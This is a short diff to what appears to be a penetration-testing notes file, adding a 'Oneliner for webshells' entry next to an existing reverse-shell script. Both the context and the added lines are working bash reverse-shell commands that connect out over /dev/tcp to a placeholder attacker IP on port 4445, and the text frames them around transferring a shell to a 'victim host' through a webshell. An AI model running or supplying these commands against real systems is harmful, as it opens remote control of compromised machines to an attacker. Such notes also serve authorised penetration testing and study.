@@ -15,6 +15,10 @@ Save it as shell.sh
 #!/bin/bash
 bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4445 0>&1
 ```
+Oneliner for webshells
+```
+bash -c "bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4445 0>&1"
+```
 
 ## Transfer the shell to the victim host
 Assuming we have a basic webshell
